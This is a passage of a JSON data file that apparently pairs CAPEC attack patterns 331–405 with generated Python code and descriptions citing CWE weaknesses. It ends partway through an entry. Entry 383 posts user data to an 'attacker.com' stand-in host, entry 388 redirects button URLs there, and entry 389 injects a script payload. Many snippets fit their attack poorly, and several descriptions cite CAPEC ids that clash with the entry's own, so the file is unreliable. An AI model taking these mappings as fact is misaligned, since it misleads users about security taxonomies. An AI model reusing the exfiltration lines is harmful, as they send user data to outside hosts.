    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service | Total Length\nip_header += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\nip_header += b'\\x40\\x01\\x00\\x00'  # TTL, Protocol | Header Checksum\nip_header += b'\\x7f\\x00\\x00\\x01'  # Source IP Address\nip_header += b'\\x7f\\x00\\x00\\x01'  # Destination IP Address\n\n# ICMP header fields\nicmp_header = b'\\x08\\x00\\x4d\\x62'  # Type, Code | Checksum\nicmp_header += b'\\x00\\x01\\x00\\x01'  # Identifier, Sequence Number\n\n# Send the packet\nsock.sendto(ip_header + icmp_header, ('127.0.0.1', 0))\n\n# Receive the response\nresponse, _ = sock.recvfrom(1024)\n\n# Extract the total length field from the IP header of the response\ntotal_length = response[2:4]\nprint(f'Total Length Field: {int.from_bytes(total_length, byteorder=\"big\")}')",
        "description": "This Python code snippet demonstrates the concept of the 'ICMP IP Total Length Field Probe' attack. It creates a raw socket to send an ICMP echo request to a target machine (localhost in this case). The IP header is manually constructed, including the total length field. The ICMP header is also constructed. The packet is sent, and the response is received. The code then extracts and prints the total length field from the IP header of the response. This process can be used to gather information about the target's operating system based on the response, which may vary between different systems. The code also touches on related CWEs by demonstrating how the total length field can be observed (CWE-204), and how the integrity of the message is not verified (CWE-353, CWE-924)."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet to a closed port and receive ICMP error message\ndef send_udp_probe(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(2)\n    try:\n        # Send UDP packet to closed port\n        sock.sendto(b'Test', (target_ip, target_port))\n        # Wait for ICMP error message\n        data, addr = sock.recvfrom(1024)\n        print(f'Received data: {data}')\n    except socket.timeout:\n        print('No response received')\n    finally:\n        sock.close()\n\n# Example usage\nsend_udp_probe('192.168.1.1', 12345)",
        "description": "This Python code snippet demonstrates a basic implementation of the 'ICMP IP \"ID\" Field Error Message Probe' attack. The function `send_udp_probe` sends a UDP packet to a specified IP address and port, which is assumed to be closed. The code then waits for an ICMP error message in response. This ICMP error message can be used to observe how the target system handles the IP 'ID' field, potentially revealing information about the operating system or network stack. This example embodies CWE-204 (Observable Response Discrepancy) by showing how different responses can reveal internal state information. It also touches on CWE-211 (Externally-Generated Error Message Containing Sensitive Information) by relying on the ICMP error message to gather information about the target system."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated event hosting endpoint\n@app.route('/host_event', methods=['POST'])\ndef host_event():\n    event_data = request.json\n    # Log user information in cleartext (CWE-319)\n    with open('user_data.txt', 'a') as f:\n        f.write(f\"UserID: {event_data['user_id']}, Username: {event_data['username']}\\n\")\n    return jsonify({'status': 'Event hosted successfully'})\n\n# Simulated event participation endpoint\n@app.route('/join_event', methods=['POST'])\ndef join_event():\n    user_data = request.json\n    # Transmit sensitive data in cleartext (CWE-319)\n    response = requests.post('http://attacker.com/log', json=user_data)\n    return jsonify({'status': 'Joined event successfully'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has two endpoints: '/host_event' and '/join_event'. The '/host_event' endpoint allows an adversary to host an event and log user information (user_id and username) in cleartext to a file, representing CWE-319 (Cleartext Transmission of Sensitive Information). The '/join_event' endpoint simulates users joining the event and transmits their sensitive data in cleartext to an external server controlled by the attacker, also illustrating CWE-319. This setup embodies the main idea of CAPEC-94, where an adversary monitors and harvests sensitive information during an event."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import requests\n\n# Simulate a client-side request to a server\nurl = 'http://example.com/api/data'\nheaders = {'Authorization': 'Bearer some_token'}\n\n# Vulnerable: No verification of data authenticity, no encryption\nresponse = requests.get(url, headers=headers)\n\n# Simulate an attacker modifying the response data\nif response.status_code == 200:\n    data = response.json()\n    # Attacker modifies the assumed-immutable data\n    data['user_role'] = 'admin'\n\n    # Client sends the modified data back to the server\n    # Vulnerable: Client-side enforcement of server-side security\n    update_url = 'http://example.com/api/update_role'\n    update_response = requests.post(update_url, json=data, headers=headers)\n\n    if update_response.status_code == 200:\n        print('Role updated successfully')\n    else:\n        print('Failed to update role')\nelse:\n    print('Failed to retrieve data')",
        "description": "This Python code snippet demonstrates a vulnerable client-server interaction where an attacker can manipulate API messages. The client requests data from a server without verifying the authenticity of the data (CWE-345, CWE-346) and without encrypting sensitive information (CWE-311). The attacker intercepts and modifies the response data, changing the user's role to 'admin' (CWE-471). The client then sends this modified data back to the server, relying on the client to enforce server-side security (CWE-602). This represents an application-layer man-in-the-middle attack where the server trusts the integrity of the data supplied by the client, leading to potential unauthorized access and privilege escalation."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import requests\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n\n# Simulated API endpoint for a transaction\napi_endpoint = 'http://example.com/api/transaction'\n\n# Simulated transaction data\ntransaction_data = {\n    'sender': 'user123',\n    'receiver': 'user456',\n    'amount': 100\n}\n\n# Attacker intercepts and modifies the transaction data\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\ntransaction_data['receiver'] = 'attacker_account'\ntransaction_data['amount'] = 1000\n\n# Sending the modified transaction data to the server\nresponse = requests.post(api_endpoint, json=transaction_data)\n\n# Print the response from the server\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified version of 'Transaction or Event Tampering via Application API Manipulation'. The code simulates an API transaction where an attacker intercepts and modifies the transaction data before it is sent to the server. The attacker changes the receiver and the amount of the transaction, exploiting several weaknesses: missing encryption (CWE-311), client-side enforcement of server-side security (CWE-602), insufficient verification of data authenticity (CWE-345), origin validation error (CWE-346), and modification of assumed-immutable data (CWE-471). This results in the server processing a fraudulent transaction."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# CWE-345: Insufficient Verification of Data Authenticity\n@app.route('/redirect', methods=['GET'])\ndef redirect_user():\n    target_url = request.args.get('target')\n    if not target_url:\n        return 'No target URL provided', 400\n    # CWE-346: Origin Validation Error\n    if 'trusted.com' not in target_url:\n        return 'Untrusted target URL', 400\n    return redirect(target_url)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n@app.route('/profile', methods=['POST'])\ndef update_profile():\n    user_id = request.form['user_id']\n    new_profile_pic = request.form['profile_pic']\n    # CWE-471: Modification of Assumed-Immutable Data (MAID)\n    # Assume user_id is immutable and not verify it properly\n    # CWE-311: Missing Encryption of Sensitive Data\n    # Assume profile_pic URL is sensitive and not encrypt it\n    # This allows an attacker to inject a malicious URL\n    # that redirects to an attacker-controlled site\n    return f'Profile updated for user {user_id} with new picture {new_profile_pic}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The '/redirect' endpoint allows users to be redirected to a target URL provided as a query parameter. The code insufficiently verifies the authenticity of the target URL (CWE-345) and does not properly validate the origin of the URL (CWE-346), allowing potential navigation remapping attacks. The '/profile' endpoint allows users to update their profile picture. It assumes the user_id is immutable and does not verify it properly (CWE-471). Additionally, it does not encrypt the profile picture URL (CWE-311), allowing an attacker to inject a malicious URL that could redirect users to an attacker-controlled site. The code also relies on client-side enforcement of server-side security (CWE-602), making it easier for attackers to exploit these vulnerabilities."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import requests\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\n# Simulate a client-side request to a server\nresponse = requests.get('http://example.com/data')\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# Attacker intercepts and modifies the response data\nmalicious_content = response.text.replace('original_content', 'malicious_content')\n\n# Client processes the modified data without verifying its authenticity\nprint(malicious_content)\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker intercepts and modifies data between a client and a server, embodying the CAPEC 'Navigation Remapping To Propagate Malicious Content'. The code highlights several related CWEs: it shows insufficient verification of data authenticity (CWE-345) and origin validation error (CWE-346) by not checking the source or integrity of the data. It also demonstrates client-side enforcement of server-side security (CWE-602) by relying on the client to handle data securely, and missing encryption of sensitive data (CWE-311) by transmitting data in plaintext. Finally, it illustrates the modification of assumed-immutable data (CWE-471) by altering the response content before processing it."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import requests\n\n# Simulate a client-side API request\nresponse = requests.get('http://example.com/api/getButtons')\n\n# CWE-345: Insufficient Verification of Data Authenticity\nif response.status_code == 200:\n    buttons = response.json().get('buttons', [])\n    for button in buttons:\n        # CWE-471: Modification of Assumed-Immutable Data (MAID)\n        if 'url' in button:\n            # CWE-602: Client-Side Enforcement of Server-Side Security\n            button['url'] = 'http://attacker.com/malicious'\n\n# CWE-311: Missing Encryption of Sensitive Data\n# Sending manipulated data back to the server without encryption\nrequests.post('http://example.com/api/updateButtons', json={'buttons': buttons})",
        "description": "This Python code snippet demonstrates a scenario where an attacker manipulates API button data on the client side. The code fetches button data from a server, modifies the URLs of the buttons to point to an attacker-controlled destination, and sends the manipulated data back to the server. The code highlights several vulnerabilities: insufficient verification of data authenticity (CWE-345), modification of assumed-immutable data (CWE-471), client-side enforcement of server-side security (CWE-602), and missing encryption of sensitive data (CWE-311). This represents the CAPEC concept of 'Application API Button Hijacking' by showing how an attacker can alter button destinations in API messages to redirect users to malicious sites."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import requests\n\n# Vulnerable API endpoint\napi_url = 'http://example.com/api/data'\n\n# Attacker intercepts and manipulates the request\nmanipulated_data = {\n    'user_id': 'attacker',\n    'content': '<script>alert(\"Hacked!\")</script>'\n}\n\n# Sending manipulated data to the server\nresponse = requests.post(api_url, json=manipulated_data)\n\n# Print the server's response\nprint(response.text)",
        "description": "This Python code snippet demonstrates a basic example of 'Content Spoofing Via Application API Manipulation' (CAPEC-111). The attacker intercepts and manipulates the data being sent to a vulnerable API endpoint. In this case, the attacker changes the 'user_id' to 'attacker' and injects a malicious script into the 'content' field. The manipulated data is then sent to the server, which processes it without proper integrity checks (CWE-353) or server-side validation (CWE-602). This can lead to various attacks, such as injecting deceptive content or executing malicious scripts. The code highlights the importance of implementing robust server-side security measures to prevent such vulnerabilities."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import os\nimport time\n\nclass PhysicalSecurityBypass:\n    def __init__(self, lock_status=True, alarm_status=True):\n        self.lock_status = lock_status\n        self.alarm_status = alarm_status\n\n    def bypass_lock(self):\n        # Simulate bypassing the lock\n        self.lock_status = False\n        print('Lock bypassed.')\n\n    def disable_alarm(self):\n        # Simulate disabling the alarm\n        self.alarm_status = False\n        print('Alarm disabled.')\n\n    def access_sensitive_area(self):\n        if not self.lock_status and not self.alarm_status:\n            print('Accessing sensitive area...')\n            # Simulate accessing sensitive information\n            sensitive_info = 'Sensitive Data'\n            print(f'Accessed: {sensitive_info}')\n        else:\n            print('Access denied. Lock or alarm is still active.')\n\n# Example usage\nbypass = PhysicalSecurityBypass()\nbypass.bypass_lock()\ntime.sleep(1)  # Simulate time taken to bypass lock\nbypass.disable_alarm()\ntime.sleep(1)  # Simulate time taken to disable alarm\nbypass.access_sensitive_area()",
        "description": "This Python code snippet simulates the process of bypassing physical security mechanisms, such as locks and alarms, to access a sensitive area. The 'PhysicalSecurityBypass' class has methods to bypass a lock and disable an alarm, representing the CAPEC's main idea of evading physical security. The 'access_sensitive_area' method checks if both the lock and alarm have been bypassed before granting access to sensitive information. This code embodies the vulnerabilities described in the related CWEs, such as improper physical access control (CWE-1263) and improper protection for outbound error messages and alert signals (CWE-1320)."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock:\n    def __init__(self, lock_bit=True):\n        self.lock_bit = lock_bit\n        self.address_region = [0] * 100  # Simulated address region\n\n    def set_lock(self):\n        self.lock_bit = True\n\n    def unset_lock(self):\n        self.lock_bit = False\n\n    def modify_address(self, index, value):\n        if not self.lock_bit:\n            self.address_region[index] = value\n        else:\n            print(\"Access Denied: Lock is set.\")\n\n    def debug_mode_override(self):\n        # Simulate debug mode that can override the lock\n        self.lock_bit = False\n        print(\"Debug mode: Lock overridden.\")\n\n# Example usage\nlock = PhysicalLock()\nlock.set_lock()\nlock.modify_address(10, 42)  # Should print access denied\nlock.debug_mode_override()  # Overrides the lock\nlock.modify_address(10, 42)  # Successfully modifies the address\nprint(lock.address_region[10])  # Should print 42",
        "description": "This Python code snippet simulates a physical lock mechanism with a lock bit that controls access to a protected address region. The `PhysicalLock` class includes methods to set and unset the lock, modify the address region, and override the lock in debug mode. The `modify_address` method checks the lock bit before allowing modifications, representing CWE-1231 (Improper Prevention of Lock Bit Modification) and CWE-1222 (Insufficient Granularity of Address Regions Protected by Register Locks). The `debug_mode_override` method simulates a scenario where the lock can be bypassed during debug mode, representing CWE-1234 (Hardware Internal or Debug Modes Allow Override of Locks). This code embodies the main idea of CAPEC-559 (Bypassing Physical Locks) by demonstrating how an attacker could bypass security measures to gain unauthorized access."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "import random\n\nclass Lock:\n    def __init__(self, key):\n        self.correct_key = key\n        self.locked = True\n        self.lock_bit = True  # Represents a register lock bit\n\n    def insert_key(self, key):\n        if key == self.correct_key:\n            self.locked = False\n        else:\n            self.bump_key(key)\n\n    def bump_key(self, key):\n        # Simulate bump key attack by random chance of success\n        if random.choice([True, False]):\n            self.locked = False\n            self.lock_bit = False  # Improper prevention of lock bit modification\n\n    def is_locked(self):\n        return self.locked\n\n# Example usage\nlock = Lock('correct_key')\nprint(f'Initial lock state: {lock.is_locked()}')\n\n# Attempt to unlock with a bump key\nlock.insert_key('bump_key')\nprint(f'Lock state after bump key attempt: {lock.is_locked()}')",
        "description": "This Python code snippet simulates a lock mechanism that can be compromised using a bump key, embodying the main idea of the CAPEC 'Lock Bumping'. The `Lock` class has a `correct_key` and a `lock_bit` to represent the lock's state. The `insert_key` method checks if the inserted key is correct; if not, it attempts a bump key attack via the `bump_key` method, which randomly decides if the lock opens, simulating the bump key's effect. The `lock_bit` is set to False upon a successful bump, representing 'Improper Prevention of Lock Bit Modification' (CWE-1231). This code demonstrates how a lock can be bypassed without the correct key, highlighting the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n\n    def lock(self):\n        if not self.locked:\n            self.locked = True\n        else:\n            raise Exception('Resource already locked')\n\n    def unlock(self):\n        if self.locked:\n            self.locked = False\n        else:\n            raise Exception('Resource not locked')\n\nclass Resource:\n    def __init__(self):\n        self.lock = Lock()\n        self.data = 'Sensitive Data'\n\n    def access(self):\n        if not self.lock.locked:\n            return self.data\n        else:\n            raise Exception('Resource is locked')\n\n# Simulating lock picking by bypassing the lock mechanism\nresource = Resource()\n\n# Bypassing the lock\nresource.lock.locked = False  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n# Accessing the resource without proper unlocking\nprint(resource.access())  # Should print 'Sensitive Data'\n\n# Attempting to unlock an already unlocked resource\ntry:\n    resource.lock.unlock()  # CWE-832: Unlock of a Resource that is not Locked\nexcept Exception as e:\n    print(e)\n\n# Simulating deadlock scenario\nlock1 = Lock()\nlock2 = Lock()\n\ndef thread1():\n    lock1.lock()\n    threading.Event().wait(1)\n    lock2.lock()\n\n\ndef thread2():\n    lock2.lock()\n    threading.Event().wait(1)\n    lock1.lock()\n\n# Starting threads to create deadlock\nthreading.Thread(target=thread1).start()\nthreading.Thread(target=thread2).start()  # CWE-833: Deadlock",
        "description": "This Python code snippet demonstrates the concept of lock picking and related weaknesses in lock mechanisms. The `Lock` class simulates a simple lock with methods to lock and unlock a resource. The `Resource` class uses this lock to protect access to sensitive data. The code then simulates a lock picking attack by directly modifying the lock's state (CWE-1231: Improper Prevention of Lock Bit Modification) and accessing the resource without proper unlocking. It also demonstrates an attempt to unlock an already unlocked resource (CWE-832: Unlock of a Resource that is not Locked) and a deadlock scenario (CWE-833: Deadlock) using threading."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n        self.lock = threading.Lock()\n\n    def acquire(self):\n        with self.lock:\n            if not self.locked:\n                self.locked = True\n                print('Lock acquired')\n            else:\n                print('Lock already acquired')\n\n    def release(self):\n        with self.lock:\n            if self.locked:\n                self.locked = False\n                print('Lock released')\n            else:\n                print('Lock already released')\n\n    def force_unlock(self):\n        with self.lock:\n            self.locked = False\n            print('Lock forced open')\n\n# Simulating improper lock behavior after power state transition\nlock = Lock()\nlock.acquire()\nlock.force_unlock()  # Forcing the lock open, similar to using a Snap Gun\nlock.acquire()  # Acquiring the lock again after forced unlock\n",
        "description": "This Python code snippet simulates the concept of using a Snap Gun to force a lock open, as described in the CAPEC. The `Lock` class represents a lock with methods to acquire, release, and forcefully unlock it. The `force_unlock` method simulates the action of a Snap Gun by forcibly setting the lock state to unlocked, regardless of its current state. This is analogous to the Snap Gun's ability to force the lock into an unlocked position. The code also demonstrates improper lock behavior after a power state transition, as described in CWE-1232, by allowing the lock to be forcefully unlocked and then re-acquired. This represents a security vulnerability where the lock's state can be manipulated inappropriately."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import hashlib\n\n# Simulate a broken cryptographic algorithm (MD5 is considered broken)\ndef generate_card_hash(card_id):\n    return hashlib.md5(card_id.encode()).hexdigest()\n\n# Simulate the use of a hard-coded cryptographic key\nHARD_CODED_KEY = 'hardcodedkey123'\n\n# Simulate generating a card with a hard-coded key\ndef generate_access_card(card_id):\n    card_hash = generate_card_hash(card_id)\n    return f'{card_hash}:{HARD_CODED_KEY}'\n\n# Example usage\ncard_id = 'employee123'\naccess_card = generate_access_card(card_id)\nprint(f'Generated Access Card: {access_card}')",
        "description": "This Python code snippet demonstrates a simplified scenario of generating an access card using a broken cryptographic algorithm (MD5) and a hard-coded cryptographic key. The `generate_card_hash` function uses MD5 to hash a card ID, which is considered insecure. The `generate_access_card` function combines this hash with a hard-coded key to simulate the creation of an access card. This embodies the main idea of the CAPEC by showing how weak cryptographic practices can be exploited to bypass electronic locks and access controls. An attacker could reverse-engineer the algorithm and key to generate valid access cards."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing a hashed password (using a weak hash algorithm)\nstored_password_hash = hashlib.md5('securepassword'.encode()).hexdigest()\n\n# Simulate an attacker capturing and replaying the hashed password\ncaptured_hash = stored_password_hash\n\n# Authentication function\ndef authenticate(input_hash):\n    if input_hash == stored_password_hash:\n        return 'Authentication Successful'\n    else:\n        return 'Authentication Failed'\n\n# Attacker replays the captured hash\nresult = authenticate(captured_hash)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerable authentication system that uses a weak cryptographic algorithm (MD5) to hash passwords. The stored password hash is susceptible to capture-replay attacks, where an attacker can capture the hashed password and replay it to bypass authentication. This example embodies the main idea of the deprecated CAPEC related to bypassing card or badge-based systems, specifically focusing on CWE-290 (Authentication Bypass by Spoofing), CWE-294 (Authentication Bypass by Capture-replay), and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import copy\n\nclass MagStripeCard:\n    def __init__(self, card_number, expiration_date, cvv):\n        self.card_number = card_number\n        self.expiration_date = expiration_date\n        self.cvv = cvv\n\n    def __str__(self):\n        return f'Card Number: {self.card_number}, Expiration Date: {self.expiration_date}, CVV: {self.cvv}'\n\n# Original card with sensitive information\noriginal_card = MagStripeCard('1234-5678-9012-3456', '12/25', '123')\nprint('Original Card:', original_card)\n\n# Cloning the card (CWE-498: Cloneable Class Containing Sensitive Information)\ncloned_card = copy.copy(original_card)\nprint('Cloned Card:', cloned_card)\n\n# Demonstrating the ease of duplication (CAPEC-111: Cloning Magnetic Strip Cards)\n# An attacker can now use the cloned card to gain unauthorized access\n",
        "description": "This Python code snippet demonstrates the vulnerability of cloning magnetic stripe cards, as described in CAPEC-111. The `MagStripeCard` class contains sensitive information such as card number, expiration date, and CVV. The class is cloneable using Python's `copy` module, which aligns with CWE-498 (Cloneable Class Containing Sensitive Information). The code shows how an attacker can easily duplicate a card by cloning an instance of the `MagStripeCard` class, thereby gaining unauthorized access to the card's information. This highlights the ease of unauthorized duplication of magstripe cards."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import itertools\nimport string\n\n# Simulate a magnetic strip card data\nvalid_card_data = '1234567890123456'\n\n# Brute force function to generate card data\ndef brute_force_card_data(valid_data):\n    charset = string.digits\n    for attempt in itertools.product(charset, repeat=len(valid_data)):\n        generated_data = ''.join(attempt)\n        if generated_data == valid_data:\n            return generated_data\n    return None\n\n# Simulate excessive authentication attempts\nattempts = 0\nmax_attempts = 1000000  # No restriction on excessive attempts\nwhile attempts < max_attempts:\n    generated_data = brute_force_card_data(valid_card_data)\n    if generated_data:\n        print(f'Valid card data found: {generated_data}')\n        break\n    attempts += 1\n\nif attempts == max_attempts:\n    print('Failed to find valid card data')",
        "description": "This Python code snippet simulates a brute force attack on magnetic strip card data, embodying the main idea of CAPEC-117. The code generates possible card data combinations using a brute force approach and checks if any of the generated data matches the valid card data. The lack of restriction on excessive authentication attempts (CWE-307) is demonstrated by allowing up to 1,000,000 attempts without any lockout mechanism. This represents the vulnerability where an adversary can generate valid card sequences to gain unauthorized access. The code does not implement any cryptographic measures, highlighting the risk of using weak or no encryption (CWE-327, CWE-321)."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import random\n\nclass RFIDChip:\n    def __init__(self, identifier):\n        self.identifier = identifier\n\n    def get_signal(self):\n        # Simulate signal with identifier\n        return f'SIGNAL-{self.identifier}'\n\n# Simulate insecure security identifier mechanism\nclass InsecureRFIDSystem:\n    def __init__(self):\n        self.chips = {}\n\n    def add_chip(self, chip):\n        if chip.identifier in self.chips:\n            print('Warning: Duplicate identifier detected!')\n        self.chips[chip.identifier] = chip\n\n    def read_chip(self, identifier):\n        if identifier in self.chips:\n            return self.chips[identifier].get_signal()\n        else:\n            return 'Unknown Chip'\n\n# Create an insecure RFID system\nrfid_system = InsecureRFIDSystem()\n\n# Add RFID chips with duplicate identifiers\nchip1 = RFIDChip('12345')\nchip2 = RFIDChip('12345')  # Duplicate identifier\n\nrfid_system.add_chip(chip1)\nrfid_system.add_chip(chip2)\n\n# Attacker clones the RFID signal\ncloned_signal = rfid_system.read_chip('12345')\nprint(f'Cloned Signal: {cloned_signal}')",
        "description": "This Python code snippet simulates an insecure RFID system that is vulnerable to cloning attacks. The `RFIDChip` class represents an RFID chip with a unique identifier. The `InsecureRFIDSystem` class manages multiple RFID chips but does not handle duplicate identifiers securely, embodying CWE-694 (Use of Multiple Resources with Duplicate Identifier). The code demonstrates how an attacker can clone an RFID signal by exploiting the system's inability to manage unique identifiers properly. The `add_chip` method warns about duplicate identifiers, but the system still allows them, leading to potential security breaches."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "import rfidlib\n\nclass RFIDChip:\n    def __init__(self, id):\n        self.id = id\n        self.active = True\n        self.sensitive_data = 'Sensitive Information'\n\n    def deactivate_chip(self):\n        # CWE-1191: No access control for deactivation\n        self.active = False\n        print(f'RFID chip {self.id} deactivated.')\n\n    def inject_error(self):\n        # CWE-1334: Unauthorized error injection\n        self.active = False\n        print(f'Error injected into RFID chip {self.id}. Chip deactivated.')\n\n    def scrub_data(self):\n        # CWE-1266: Improper scrubbing of sensitive data\n        self.sensitive_data = None\n        print(f'Sensitive data on RFID chip {self.id} scrubbed.')\n\n# Example usage\nrfid_chip = RFIDChip('12345')\nrfid_chip.deactivate_chip()\nrfid_chip.inject_error()\nrfid_chip.scrub_data()",
        "description": "This Python code snippet represents the concept of deactivating or destroying an RFID chip, as described in the CAPEC. The RFIDChip class simulates an RFID chip with methods to deactivate the chip, inject errors, and scrub sensitive data. The deactivation method lacks proper access control (CWE-1191), allowing unauthorized deactivation. The inject_error method simulates unauthorized error injection (CWE-1334) to deactivate the chip. The scrub_data method represents the scrubbing of sensitive data, which may be improperly handled (CWE-1266). This code demonstrates how vulnerabilities in RFID chips can be exploited to render them unresponsive or to improperly handle sensitive data."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import os\nimport time\n\n# Simulate improper physical access control\nclass HardwareDevice:\n    def __init__(self):\n        self.secure_data = 'Sensitive Information'\n        self.debug_mode = False\n\n    def enable_debug_mode(self):\n        # CWE-1313: Allowing activation of debug logic at runtime\n        self.debug_mode = True\n        print('Debug mode enabled')\n\n    def read_secure_data(self):\n        if self.debug_mode:\n            # CWE-1300: Exposing sensitive information via side channels\n            print(f'Accessing secure data: {self.secure_data}')\n        else:\n            print('Access denied: Debug mode not enabled')\n\n# Simulate an attacker gaining physical access\nattacker = HardwareDevice()\n\n# CWE-1263: Improper physical access control\n# Attacker enables debug mode to access secure data\nattacker.enable_debug_mode()\n\n# CWE-1256: Improper restriction of software interfaces to hardware features\n# Attacker reads secure data using debug mode\nattacker.read_secure_data()\n\n# CWE-1247: No protection against voltage and clock glitches\n# Simulate a delay to represent a glitch attack\nprint('Simulating voltage/clock glitch...')\ntime.sleep(1)\n\n# Attacker reads secure data again\nattacker.read_secure_data()",
        "description": "This Python code snippet simulates a scenario where an attacker gains physical access to a hardware device and exploits various weaknesses to access sensitive information. The `HardwareDevice` class represents a device with secure data and a debug mode. The attacker enables the debug mode (CWE-1313) to bypass access controls and read secure data (CWE-1300). The code also simulates improper physical access control (CWE-1263) and improper restriction of software interfaces to hardware features (CWE-1256). Additionally, it includes a delay to represent a voltage or clock glitch attack (CWE-1247). This snippet embodies the main idea of the CAPEC by demonstrating how physical access and hardware vulnerabilities can be exploited to undermine system integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "class ATADrive:\n    def __init__(self, password):\n        self.password = password\n        self.locked = True\n\n    def unlock(self, password):\n        if password == self.password:\n            self.locked = False\n        else:\n            raise ValueError(\"Incorrect password\")\n\n    def update_password(self, new_password):\n        # Vulnerability: Allows password update without checking if the drive is unlocked\n        self.password = new_password\n\n# Example usage\nata_drive = ATADrive(\"initial_password\")\ntry:\n    ata_drive.unlock(\"wrong_password\")\nexcept ValueError as e:\n    print(e)\n\n# Vulnerability exploitation: Update password without unlocking\nata_drive.update_password(\"new_password\")\n\n# Now the drive can be unlocked with the new password\nata_drive.unlock(\"new_password\")\nprint(\"Drive unlocked:\", not ata_drive.locked)",
        "description": "This Python code snippet represents a simplified model of an ATA drive with a password protection mechanism. The `ATADrive` class has methods to unlock the drive and update the password. The vulnerability lies in the `update_password` method, which allows the password to be changed without verifying if the drive is currently unlocked. This mirrors the CAPEC scenario where an adversary can bypass ATA password security by exploiting improper authorization (CWE-285) and insufficient granularity of access control (CWE-1220). The code demonstrates how an attacker can change the password without proper authentication, thereby gaining unauthorized access to the drive."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import socket\nimport logging\n\n# Vulnerable code: Reliance on DNS Lookups in a Security Decision\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n\ndef is_trusted_host(hostname):\n    try:\n        ip_address = socket.gethostbyname(hostname)\n        # Vulnerable decision based on DNS lookup\n        if ip_address == '192.168.1.1':\n            return True\n        else:\n            return False\n    except socket.error:\n        return False\n\n# Vulnerable code: Information Exposure Through Server Log Files\n# CWE-532: Information Exposure Through Log Files\n\ndef log_user_login(username):\n    logging.basicConfig(filename='server.log', level=logging.INFO)\n    logging.info(f'User {username} logged in')\n\n# Example usage\nhostname = 'example.com'\nif is_trusted_host(hostname):\n    log_user_login('admin')\nelse:\n    print('Untrusted host')",
        "description": "This Python code snippet demonstrates vulnerabilities related to deprecated CAPEC and CWEs. The function `is_trusted_host` relies on DNS lookups to make security decisions, which is vulnerable as per CWE-350. The function `log_user_login` logs sensitive information to a server log file, exposing information as per CWE-532. The code represents the deprecated CAPEC's idea of social information gathering attacks by showing how improper handling of DNS lookups and logging can lead to security issues."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
